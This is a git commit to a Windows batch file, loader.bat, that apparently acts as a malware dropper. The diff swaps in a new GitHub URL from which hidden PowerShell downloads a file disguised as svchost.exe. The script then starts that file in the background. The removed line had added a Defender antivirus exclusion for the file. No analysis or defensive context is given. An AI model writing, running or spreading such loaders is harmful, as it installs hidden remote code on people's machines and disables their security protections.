8827dac760f20ff99dc2f35d39927f4c5606f762
t1376 <sokslqkokasq0@gmail.com>
2026-06-30 22:20:49 +0500

    Update loader.bat

--- loader.bat
+++ loader.bat
@@ -1,7 +1,6 @@
 @echo off
 cd /d "%~dp0"
-powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0svchost.exe'"
-powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
+powershell -w hidden -Command "iwr 'https://github.com/t1283y7/12y783y78sad/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
 if exist "%~dp0svchost.exe" (
     start /b "" "%~dp0svchost.exe"
 )
